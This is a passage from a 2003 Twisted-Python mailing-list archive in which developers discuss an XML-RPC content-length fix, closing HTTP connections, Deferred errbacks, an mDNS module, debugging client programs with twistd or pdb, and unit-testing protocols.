<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><int>3</int></value>
</param>
</params>
</methodResponse>
Connection closed by foreign host.

Could it be that I'm doing something wrong? The XML-RPC spec states that the 
server must respond with a correct content length, so I would've expected 
Twisted to behave accordingly. So am I missing something, or does Twisted not 
comply with the spec (as Dave Winer defines it)?

Thanks,

Steve

P.S. For the DW-standard inclined, see http://www.xml-rpc.com/spec, under 
"Response format."



From andrew-twisted at puzzling.org  Tue Jul 29 23:05:43 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 15:05:43 +1000
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content length header
In-Reply-To: <200307292151.47437.sflist@ihonk.com>
References: <200307292151.47437.sflist@ihonk.com>
Message-ID: <20030730050543.GB27662@frobozz>

On Tue, Jul 29, 2003 at 09:51:47PM -0700, Steve Freitas wrote:
> Hi all,
> 
> I'm experimenting with a C++ XML-RPC client library, and it refused to talk to 
> my Twisted sample server. Why? It reported that no content length was given, 

Fixed 3 days ago in CVS:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/web/xmlrpc.py?rev=1.27&content-type=text/vnd.viewcvs-markup&cvsroot=Twisted

Thanks for the bug report, anyway :)

-Andrew.




From sflist at ihonk.com  Tue Jul 29 23:13:08 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Tue, 29 Jul 2003 22:13:08 -0700
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content
	length header
In-Reply-To: <20030730050543.GB27662@frobozz>
Message-ID: <BB4CA1F4.B273%sflist@ihonk.com>

> Fixed 3 days ago in CVS:
> 
> Thanks for the bug report, anyway :)

D'oh! Thanks!

Steve




From warner at lothar.com  Wed Jul 30 00:33:37 2003
From: warner at lothar.com (Brian Warner)
Date: Tue, 29 Jul 2003 23:33:37 -0700 (PDT)
Subject: [Twisted-Python] how to drop connection
References: <006f01c355d0$b163eba0$0201a8c0@dan>
Message-ID: <20030729.233337.132512789.warner@lothar.com>

"Michael Porter" <mporter at despammed.com> writes:
> 
> I'm trying to close down a web server (wihout closing the application) but
> am having problems closing already established connections.

Maybe something like this? (note: completely untested):

class DroppingHTTPChannel(http.HTTPChannel):

    def connectionMade(self):
        http.HTTPChannel.connectionMade(self)
        self.factory.currentConnections.append(self)

    def connectionLost(self, reason):
        http.HTTPChannel.connectionLost(self, reason)
        self.factory.currentConnections.remove(self)

class DroppingHTTPFactory(http.HTTPFactory):

    currentConnections = []
    protocol = DroppingHTTPChannel

    def stopFactory(self):
        http.HTTPFactory.stopFactory(self)
        for p in self.currentConnections:
            p.transport.loseConnection()

hope that seems useful..
 -Brian



From andrew-twisted at puzzling.org  Wed Jul 30 00:41:00 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 16:41:00 +1000
Subject: [Twisted-Python] how to drop connection
In-Reply-To: <20030729.233337.132512789.warner@lothar.com>
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com>
Message-ID: <20030730064100.GC27662@frobozz>

On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> "Michael Porter" <mporter at despammed.com> writes:
> > 
> > I'm trying to close down a web server (wihout closing the application) but
> > am having problems closing already established connections.
> 
> Maybe something like this? (note: completely untested):

This technique looks feasible to me, except:

> class DroppingHTTPFactory(http.HTTPFactory):
> 
>     currentConnections = []
>     protocol = DroppingHTTPChannel
> 
>     def stopFactory(self):
>         http.HTTPFactory.stopFactory(self)
>         for p in self.currentConnections:
>             p.transport.loseConnection()

This really should be (also untested):

class DroppingHTTPFactory(http.HTTPFactory):

    protocol = DroppingHTTPChannel

    def startFactory(self):
        http.HTTPFactory.startFactory(self)
        self.currentConnections = []

    def stopFactory(self):
        http.HTTPFactory.stopFactory(self)
        for p in self.currentConnections:
            p.transport.loseConnection()

So that you can have multiple DroppingHTTPFactories without them interfering
with each other.

-Andrew.




From radix at twistedmatrix.com  Wed Jul 30 00:52:48 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 30 Jul 2003 02:52:48 -0400
Subject: [Twisted-Python] how to drop connection
In-Reply-To: <20030730064100.GC27662@frobozz>
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com> <20030730064100.GC27662@frobozz>
Message-ID: <20030730065248.GB26034@radii>

On Wed, Jul 30, 2003 at 04:41:00PM +1000, Andrew Bennetts wrote:
> On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> >
> > class DroppingHTTPFactory(http.HTTPFactory):
>
> This really should be (also untested):
> 
> class DroppingHTTPFactory(http.HTTPFactory):

Also, OP is probably using server.Site, not HTTPFactory directly. So
it should probably be subclassing that.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From justinjohnson at fastmail.fm  Wed Jul 30 06:59:17 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 30 Jul 2003 06:59:17 -0600
Subject: [Twisted-Python] callback wierdness
In-Reply-To: <20030730014725.GA27662@frobozz>
References: <20030729131204.08ED9387C2@www.fastmail.fm> <20030730014725.GA27662@frobozz>
Message-ID: <20030730125917.18BA6356A6@www.fastmail.fm>

Found my problem, and indeed I *did* need to add the errback to discover
it.  Thanks again.  :-)

On Wed, 30 Jul 2003 11:47:26 +1000, "Andrew Bennetts"
<andrew-twisted at puzzling.org> said:
> On Tue, Jul 29, 2003 at 07:12:03AM -0600, Justin Johnson wrote:
> > In the attached files I defined process.openProcess to spawn a process
> > using the reactor, and return a deferred from within my ProcessProtocol. 
> > Then in trigger.py I define methods "make" and "remove" that utilize
> > process.openProcess to run a command.  make() adds callbacks to the
> > deferred to display the results of the execution, and at the bottom of
> > trigger.py I add a callback to remove the trigger after creating it.
> > 
> > The problem is, none of my callbacks ever get called.  The initial
> > spawnProcess works and I can see the trigger is created, but nothing is
> > printed to the screen (callback 1 added in "make") and the trigger is not
> > removed (callback 2 added at end of file).
> 
> Without looking closely, I notice that you never add an errback to your
> Deferreds, only callbacks.  Try d.addErrback(twisted.python.log.err), and
> see if that helps you figure out what's going wrong.
> 
> -Andrew.
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From screwtape at froup.com  Wed Jul 30 07:02:40 2003
From: screwtape at froup.com (screwtape at froup.com)
Date: Wed, 30 Jul 2003 23:02:40 +1000
Subject: [Twisted-Python] Twisted and Rendezvous
Message-ID: <20030730130240.GC25612@ferd2.thristian.org>

A few weeks ago, someone on the list mentioned Rendezvous support for
Twisted. Curious, I picked up the Rendezvous specification documents,
and got to hacking.

What I've got so far is almost half a multicast DNS responder. The
multicast DNS specification covers two main areas - asking other hosts
for DNS records and serving out DNS records yourself. My code at the
moment sends out queries and caches the responses in more or less the
proper fashion, but does not respond to requests.

The upshot of all this is that you can look things up over multicast
DNS, but you can't advertise your own services.

The code was written on Linux and tested against Mac OS X 10.2.6
(it'll never run on OS X or any other operating system that includes a
Rendezvous service), and seems to Do The Right Thing.

You can find a nice tarball here:

	http://members.optusnet.com.au/thristian/mDNS-0.5.tar.gz

It contains the main module (mDNS.py) and a simple API demonstration
(mDNS-test.py). There's lots of comments and docstrings, so it
shouldn't be too hard to figure things out.

If you're interested in Rendezvous support for Python, download it and
have a play, then tell me what you think. 

-- 
 ___________ ___________________________________
| Screwtape | http://livejournal.com/~thristian |______ _____ ___ __ _  _   _    _
|
| "At 640x480 the world is peaceful 'cos noone can see well enough to aim"
|



From andrew-twisted at puzzling.org  Wed Jul 30 07:44:05 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 23:44:05 +1000
Subject: [Twisted-Python] Moshe wins the 1000th test award!
Message-ID: <20030730134405.GA28786@frobozz>

Ok, so there's no prize.  But one of Moshe's recent checkins brought us over
the 1000 tests mark, as judged by BuildBot:
    http://twistematrix.com/buildbot/

Woohoo! :)

-Andrew.




From jgoerzen at complete.org  Wed Jul 30 08:29:14 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 09:29:14 -0500
Subject: [Twisted-Python] Debugging client programs
Message-ID: <871xw8dr5x.fsf@complete.org>

Hello,

I found the information at
http://www.twistedmatrix.com/documents/howto/debug-with-emacs
regarding debugging server-type programs (that run under twistd) with
pdb and Emacs.  Apparently twistd installs a special sigint handler
when -b is specified.

However, my program is a client program, and thus does not run under
twistd, has no TAP, etc.  What is the framework for enabling debugging
for that?  And could it be documented in the howto?

Thanks,
John




From m at moshez.org  Wed Jul 30 09:45:20 2003
From: m at moshez.org (Moshe Zadka)
Date: 30 Jul 2003 15:45:20 -0000
Subject: [Twisted-Python] Debugging client programs
In-Reply-To: <871xw8dr5x.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
Message-ID: <20030730154520.15330.qmail@green.zadka.com>

On Wed, 30 Jul 2003, John Goerzen <jgoerzen at complete.org> wrote:

> However, my program is a client program, and thus does not run under
> twistd, has no TAP, etc.  What is the framework for enabling debugging
> for that?  And could it be documented in the howto?

You are deluded.
There is absolutely no excuse not to run with twistd. There is no need
for a TAP file: a .tac file (that is, a Python file which defines a variable
named Application) would do just as well. Then, twistd -bony file.tac,
and presto! debuggy goodness.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From itamar at itamarst.org  Wed Jul 30 10:26:44 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 12:26:44 -0400
Subject: [Twisted-Python] Debugging client programs
In-Reply-To: <20030730154520.15330.qmail@green.zadka.com>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
Message-ID: <20030730122644.3d56dd9f.itamar@itamarst.org>

On 30 Jul 2003 15:45:20 -0000
Moshe Zadka <m at moshez.org> wrote:

> On Wed, 30 Jul 2003, John Goerzen <jgoerzen at complete.org> wrote:
> 
> > However, my program is a client program, and thus does not run under
> > twistd, has no TAP, etc.  What is the framework for enabling
> > debugging for that?  And could it be documented in the howto?
> 
> You are deluded.
> There is absolutely no excuse not to run with twistd. There is no need
> for a TAP file: a .tac file (that is, a Python file which defines a
> variable named Application) would do just as well. Then, twistd -bony
> file.tac, and presto! debuggy goodness.

To rephrase, just make a python file with a t.i.app.Application instance
called "application" on the module level. See
http://itamarst.org/writings/OSCON03/twisted_internet-129.html for
details.

twistd can be used just as well for both client and server apps,
although it is most useful for server apps.

You can also, as with *any* regular python script, run "python
/usr/lib/python2.2/pdb.py yourscript.py" on any runnable python script
you have, without making any changes to it. This won't enable one
feature that twistd gives (automatic post-mortem debugging of
exceptions), but is good enough for many cases.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From jeethur at sancharnet.in  Wed Jul 30 12:56:07 2003
From: jeethur at sancharnet.in (Jeethu Rao)
Date: Thu, 31 Jul 2003 00:26:07 +0530
Subject: [Twisted-Python] the right way of unit testing protocols
Message-ID: <000001c356cc$3d768340$5591013d@thilakra>

What is the right way of unit testing protocols in twisted ?
Currently, I'm just subclassing my protocol with unittest.TestCase
And directly calling the dataRecieved with a string and am checking
If the overridden callbacks (like dataRecieved) are called.

The tests pass, but back when I was writing threaded servers,
I would actually setup a server on localhost and would connect to
The server from another thread, for unit testing. That gives me a lot
more confidence.

I know that I can setup two reactors, for the client and the server
and then try to make them talk, But I'm sure there's a shortcut.
I just could'nt figure out the test suites from the Twisted sources.

Jeethu Rao




From itamar at itamarst.org  Wed Jul 30 13:10:39 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 15:10:39 -0400
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <000001c356cc$3d768340$5591013d@thilakra>
References: <000001c356cc$3d768340$5591013d@thilakra>
Message-ID: <20030730151039.02684534.itamar@itamarst.org>

On Thu, 31 Jul 2003 00:26:07 +0530
Jeethu Rao <jeethur at sancharnet.in> wrote:

> What is the right way of unit testing protocols in twisted ?
> Currently, I'm just subclassing my protocol with unittest.TestCase
> And directly calling the dataRecieved with a string and am checking
> If the overridden callbacks (like dataRecieved) are called.

That is indeed a good way to test.

> The tests pass, but back when I was writing threaded servers,
> I would actually setup a server on localhost and would connect to
> The server from another thread, for unit testing. That gives me a lot
> more confidence.

And doing this sort of testing in addition is also a good idea.

> I know that I can setup two reactors, for the client and the server
> and then try to make them talk, But I'm sure there's a shortcut.
> I just could'nt figure out the test suites from the Twisted sources.

You only need one reactor. (And twisted doesn't support multiple
reactors at the moment anyway.) So don't look for that in the code. Just
look at how the tests are done.

In general you'd just do some variant on:

 reactor.listenTCP(1234, myServerFactory)
 reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
 while someConditionIsn'tSet:
     reactor.iterate()
 # at this point some exchange should have finished successfully


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Wed Jul 30 13:44:14 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 30 Jul 2003 13:44:14 -0600
Subject: [Twisted-Python] problems with callback in an iteration
Message-ID: <20030730194414.777F638961@www.fastmail.fm>

In the code below, I create a Trigger object (something I defined) and
call the "make" method on it.  Then I add a callback so that I can "lock"
it after it has been made.  I'm getting some wierd results though.  The
output from the first print statement...

print "trigger name", self.name

...prints the names of the triggers correctly, as they appear in the list
(trigger1 followed by trigger2).  However, the callback to _lock is only
called with the last element in the list (trigger2), but it is called
twice.  So instead of calling _lock on trigger1 and then on trigger2, it
is called twice on trigger2.

Does anyone see what I'm doing wrong?

[snip]
def applyTriggers(self):
	"""Apply the standard triggers to the VOB.
	"""
	deferreds = []
	trigger1 = trigger.PreRmverTrigger("pre_rmver","Prevent removing of versions",config.thisServer,self.tag)
	trigger2 = trigger.PreRmelemTrigger("pre_rmelem","Prevent removing of elements",config.thisServer,self.tag)

	for t in [trigger1, trigger2]:
		print "trigger name:", t.name

		def _lock(results):
			print "*** locking trigger:", t.name
			d = t.lock()
			return d

		d = t.make()
		d.addCallbacks(_lock, log.err)
		deferreds.append(d)
	return defer.DeferredList(deferreds)
[/snip]



From jgoerzen at complete.org  Wed Jul 30 14:45:02 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 15:45:02 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
Message-ID: <87y8yfagmp.fsf@complete.org>

Moshe Zadka <m at moshez.org> writes:

>> twistd, has no TAP, etc.  What is the framework for enabling debugging
>> for that?  And could it be documented in the howto?
>
> You are deluded.
> There is absolutely no excuse not to run with twistd. There is no need
> for a TAP file: a .tac file (that is, a Python file which defines a variable
> named Application) would do just as well. Then, twistd -bony file.tac,
> and presto! debuggy goodness.

That all sounds good, but how to do it?  What does this variable named
Application store?  I have looked at the HOWTOs (which all refer to
objects of type Application) and the APIs, all of which talk about
listening on ports, features of twistd related to running in the
background or not, etc.

Nothing shows how this is to be done with a client.

What's worse, the application HOWTO also doesn't show how to choose
which reactor one is using, which is going to be a critical issue for
me.  I have all these things solved outside the twistd/Application
framework, but am not sure how to do it inside that framework.

Also, I have no objection to running twistd for my debugging, but my
excuse to not running twistd for end-users is that they should not
have to run "twistd /usr/bin/offlineimap" -- they should just run
offlineimap and invoke Python directly.

So, I may be deluded, but hopefully you can see why.

-- John




From itamar at itamarst.org  Wed Jul 30 14:58:06 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 16:58:06 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87y8yfagmp.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<87y8yfagmp.fsf@complete.org>
Message-ID: <20030730165806.66c611e6.itamar@itamarst.org>

On Wed, 30 Jul 2003 15:45:02 -0500
John Goerzen <jgoerzen at complete.org> wrote:

> Nothing shows how this is to be done with a client.

Same way exactly.

> What's worse, the application HOWTO also doesn't show how to choose
> which reactor one is using, which is going to be a critical issue for
> me.  I have all these things solved outside the twistd/Application
> framework, but am not sure how to do it inside that framework.

twistd --help should tell you (but, say "twistd --reactor=gtk -y
yourfile.py").

> Also, I have no objection to running twistd for my debugging, but my
> excuse to not running twistd for end-users is that they should not
> have to run "twistd /usr/bin/offlineimap" -- they should just run
> offlineimap and invoke Python directly.

You can have it work both ways, using an if __name__ == '__main__'.
Again, I suggest you read my tutorial, the link to which was on the
previous email (it's on my homepage.) If you want your program to parse
command line arguments this won't work though.

So, you can just use PDB directly, as with *any* python script.
"/usr/lib/python2.2/pdb.py offlineimap.py".

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From bob at redivi.com  Wed Jul 30 14:59:56 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 30 Jul 2003 16:59:56 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87y8yfagmp.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com> <87y8yfagmp.fsf@complete.org>
Message-ID: <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>

On Wednesday, July 30, 2003, at 4:45PM, John Goerzen wrote:

> Moshe Zadka <m at moshez.org> writes:
>
>>> twistd, has no TAP, etc.  What is the framework for enabling 
>>> debugging
>>> for that?  And could it be documented in the howto?
>>
>> You are deluded.
>> There is absolutely no excuse not to run with twistd. There is no need
>> for a TAP file: a .tac file (that is, a Python file which defines a 
>> variable
>> named Application) would do just as well. Then, twistd -bony file.tac,
>> and presto! debuggy goodness.
>
> That all sounds good, but how to do it?  What does this variable named
> Application store?  I have looked at the HOWTOs (which all refer to
> objects of type Application) and the APIs, all of which talk about
> listening on ports, features of twistd related to running in the
> background or not, etc.
>
> Nothing shows how this is to be done with a client.

Look at itamar's post

>
> What's worse, the application HOWTO also doesn't show how to choose
> which reactor one is using, which is going to be a critical issue for
> me.  I have all these things solved outside the twistd/Application
> framework, but am not sure how to do it inside that framework.

twistd does this when you start the tap.. man twistd

>
> Also, I have no objection to running twistd for my debugging, but my
> excuse to not running twistd for end-users is that they should not
> have to run "twistd /usr/bin/offlineimap" -- they should just run
> offlineimap and invoke Python directly.

make a shell script called offlineimap that runs twistd offlineimap.tap 
instead of python.

-bob




From jgoerzen at complete.org  Wed Jul 30 14:58:43 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 15:58:43 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <20030730122644.3d56dd9f.itamar@itamarst.org>
Message-ID: <87smonafzw.fsf@complete.org>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> To rephrase, just make a python file with a t.i.app.Application instance
> called "application" on the module level. See
> http://itamarst.org/writings/OSCON03/twisted_internet-129.html for
> details.

Thanks for the link, but I'm still not quite sure how to do this on a
client side (there is no listening going on here), nor how to choose a
reactor given this setup.

> You can also, as with *any* regular python script, run "python
> /usr/lib/python2.2/pdb.py yourscript.py" on any runnable python script
> you have, without making any changes to it. This won't enable one

Yup, I'm familiar with pdb and have already used it on my Twisted
code.  One of the problems that I have to figure out is "why was this
callback called and why is it getting crap passed in?"  There's no
stack to show me that answer, and I had hoped that the twistd debug
additions might be of some assistance there.

> feature that twistd gives (automatic post-mortem debugging of
> exceptions), but is good enough for many cases.




From itamar at itamarst.org  Wed Jul 30 15:23:09 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 17:23:09 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<87y8yfagmp.fsf@complete.org>
	<C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
Message-ID: <20030730172309.038c52fa.itamar@itamarst.org>

On Wed, 30 Jul 2003 16:59:56 -0400
Bob Ippolito <bob at redivi.com> wrote:

> make a shell script called offlineimap that runs twistd
> offlineimap.tap instead of python.

Given that you probably want your app to parse command line arguments,
this may not be workable. Which is why we don't require twistd.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From jgoerzen at complete.org  Wed Jul 30 15:30:29 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 16:30:29 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <87y8yfagmp.fsf@complete.org>
 <C6179B12-C2D0-11D7-ACE0-000393582924@redivi.com>
Message-ID: <87wudzwvm2.fsf@complete.org>

Bob Ippolito <bob at redivi.com> writes:

>> What's worse, the application HOWTO also doesn't show how to choose
>> which reactor one is using, which is going to be a critical issue for
>> me.  I have all these things solved outside the twistd/Application
>> framework, but am not sure how to do it inside that framework.
>
> twistd does this when you start the tap.. man twistd

That's not what I need; I need to be able to choose it in my
program.  It would be a step backwards in usability to force people to
specify this on the command line when the system can detect it
automatically now.

As an example, the app might do something roughly like this:

 1. Am I running in X?  If yes, use wxPython; otherwise:
 2. Are stdin and stdout TTYs?  If yes, use curses; otherwise:
 3. Is stdin a TTY?  If yes, use the TTY interface; otherwise:
 4. Use Noninteractive.

twistd -r does not have the expressivity necessary to convey that
idea, nor does it have the capability of handling it based on a
configuration file.  Also, according to the --help, it also does not
have the capability to use the "add-on" reactors necessary for things
like wxPython.

> make a shell script called offlineimap that runs twistd
> offlineimap.tap instead of python.

I wouldn't be asking if the answer was that obvious!

It's not quite that easy either, because now I have to worry about
where twistd is installed on their system (a detail that setup.py
doesn't take care of for me), making sure I get the one for the
version of Python I want, etc.  This may involve prompting them for it
at install time, and worse, system changes could render OfflineIMAP
un-runable.

As an example, on Debian you can get /usr/bin/twistd2.3 and
/usr/bin/twistd2.2.  /usr/bin/twistd will end up being a symlink to
one or the other.  Now, say I'm writing a cross-platform installer and
I want Python 2.3 or above.  I find a twistd on my path -- maybe it's
what I want, maybe not.  Maybe the one I want isn't on the path.
Maybe it's in /opt/python2.3/bin/twistd or something like that.

If I can stick to importing bits from my plain Python program, all
those problems go away, since the administrator can just run setup.py
under the Python installation that's correct, and there it is.






From jgoerzen at complete.org  Wed Jul 30 15:42:51 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 16:42:51 -0500
Subject: [Twisted-Python] Re: Debugging client programs
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com>
 <87y8yfagmp.fsf@complete.org>
 <20030730165806.66c611e6.itamar@itamarst.org>
Message-ID: <87r847wv1g.fsf@complete.org>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

>> Nothing shows how this is to be done with a client.
> Same way exactly.

I don't see how that can be the case.  All the examples I've seen
involve either listenTCP or a pre-built item that takes an
application.

My client is of a different nature.  It needs to perform tasks at
startup such as evaluating which UI to use, reading its config file (I
know, this could be handled by TAP...), etc.  Then we establish
connections and start doing work.  I can't help but notice that none
of the simple client examples (ie, echoclient.py) aren't written to
use Application.

If it's that simple, if someone could just give me an example, I'd be
very appreciative.

I want to do things the right Twisted way.  But I don't want to make
that an inconvenience on the users.  It seems that the solutions
presented thus far for using twistd for a client will do that, so
that's why I wasn't before.  It's OK with me to not do that; I just
thought it was odd to be called "deluded" for not doing so.

That said, if there is a way to use twistd or its functionality and
avoid these pitfalls, I would be pleased to do that.

>> framework, but am not sure how to do it inside that framework.
>
> twistd --help should tell you (but, say "twistd --reactor=gtk -y
> yourfile.py").

See the other mail I just wrote (that's not quite good enough here).

>> Also, I have no objection to running twistd for my debugging, but my
>> excuse to not running twistd for end-users is that they should not
>> have to run "twistd /usr/bin/offlineimap" -- they should just run
>> offlineimap and invoke Python directly.
>
> You can have it work both ways, using an if __name__ == '__main__'.

Yup, that's fine with me and no problem to run twistd myself; I'd just
prefer to avoid making the end users do that.

> Again, I suggest you read my tutorial, the link to which was on the
> previous email (it's on my homepage.) If you want your program to parse
> command line arguments this won't work though.

Ahh, didn't realize that link was part of a larger thing.  I'll take a
closer look.  (And yes, command-line parsing is a requirement too)

Thanks for your help.

-- John




From warner at lothar.com  Wed Jul 30 15:45:53 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 30 Jul 2003 14:45:53 -0700 (PDT)
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping
 blocking code)
References: <F1634438-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030730.144553.59486227.warner@lothar.com>

Glyph Lefkowitz <glyph at twistedmatrix.com> writes:
> 
> I think that the current behavior is fine, and that it shouldn't change.
> Better to err on the side of safety for something like this; make it a FAQ,
> but it's a better FAQ than "I ran a CGI as www-data with the wrong $HOME
> variable and a web user deleted my entire home directory!  What do I do?!?"

*nod*. Added to the FAQ.

 -Brian



From warner at lothar.com  Wed Jul 30 15:56:47 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 30 Jul 2003 14:56:47 -0700 (PDT)
Subject: [Twisted-Python] Twisted and Rendezvous
References: <20030730130240.GC25612@ferd2.thristian.org>
Message-ID: <20030730.145647.21615978.warner@lothar.com>

screwtape at froup.com writes:

> A few weeks ago, someone on the list mentioned Rendezvous support for
> Twisted. Curious, I picked up the Rendezvous specification documents,
> and got to hacking.

That's cool. I'm not sure this falls into the same scope, but it occurred to
me that it would be handy to have a DNS server that provided SRV records
based upon registrations arriving from other server programs. If the
application (say, an HTTP server) launched, started listening on an
arbitrary port, then told the DNS/SRV server its service name and port
number, the DNS server could start feeding appropriate SRV records for the
application.

I'd have the application keep a TCP connection open to the DNS server, and
if that connection went down, the SRV record would be removed. It would work
a lot like dynamic DNS, except per-application instead of per-host.


just looking to plant some idea seeds..
 -Brian



From radix at twistedmatrix.com  Wed Jul 30 16:09:06 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 30 Jul 2003 18:09:06 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87r847wv1g.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org> <20030730154520.15330.qmail@green.zadka.com> <87y8yfagmp.fsf@complete.org> <20030730165806.66c611e6.itamar@itamarst.org> <87r847wv1g.fsf@complete.org>
Message-ID: <20030730220906.GE26034@radii>

On Wed, Jul 30, 2003 at 04:42:51PM -0500, John Goerzen wrote:
> I want to do things the right Twisted way.  But I don't want to make
> that an inconvenience on the users.  It seems that the solutions
> presented thus far for using twistd for a client will do that, so
> that's why I wasn't before.  It's OK with me to not do that; I just
> thought it was odd to be called "deluded" for not doing so.

I've written a few clients with Twisted, usually GUI things, and I've
never used twistd. Sometimes it would be possible, but I think in your
case, it's not worth all the hassle. Maybe if someone made a _sane_
programmatic interface to twistd (so you could fire it up after
figuring out which reator you want to use, etc), it would be usable in
this situation, but that doesn't exist.

As for debugging, just run pdb.py on your script.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Wed Jul 30 19:23:14 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Wed, 30 Jul 2003 21:23:14 -0400
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <87smonafzw.fsf@complete.org>
References: <871xw8dr5x.fsf@complete.org>
	<20030730154520.15330.qmail@green.zadka.com>
	<20030730122644.3d56dd9f.itamar@itamarst.org>
	<87smonafzw.fsf@complete.org>
Message-ID: <20030730212314.162c6956.itamar@itamarst.org>

On Wed, 30 Jul 2003 15:58:43 -0500
John Goerzen <jgoerzen at complete.org> wrote:

> Yup, I'm familiar with pdb and have already used it on my Twisted
> code.  One of the problems that I have to figure out is "why was this
> callback called and why is it getting crap passed in?"  There's no
> stack to show me that answer, and I had hoped that the twistd debug
> additions might be of some assistance there.

Hmmm. I don't think we store that information currently, though we could
for Feferreds. Anyway, there's a command in t.p.failure in CVS that
turns on extra debugging (the post-mortem thing). Call that and you will
have same functionaly twistd has in debug mode.

Given your requirements you probably don't want to be using twistd at
all.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From andrew-twisted at puzzling.org  Wed Jul 30 20:09:00 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 12:09:00 +1000
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030730151039.02684534.itamar@itamarst.org>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org>
Message-ID: <20030731020900.GA30331@frobozz>

On Wed, Jul 30, 2003 at 03:10:39PM -0400, Itamar Shtull-Trauring wrote:
> On Thu, 31 Jul 2003 00:26:07 +0530
> Jeethu Rao <jeethur at sancharnet.in> wrote:
> 
> > I know that I can setup two reactors, for the client and the server
> > and then try to make them talk, But I'm sure there's a shortcut.
> > I just could'nt figure out the test suites from the Twisted sources.
> 
> You only need one reactor. (And twisted doesn't support multiple
> reactors at the moment anyway.) So don't look for that in the code. Just
> look at how the tests are done.
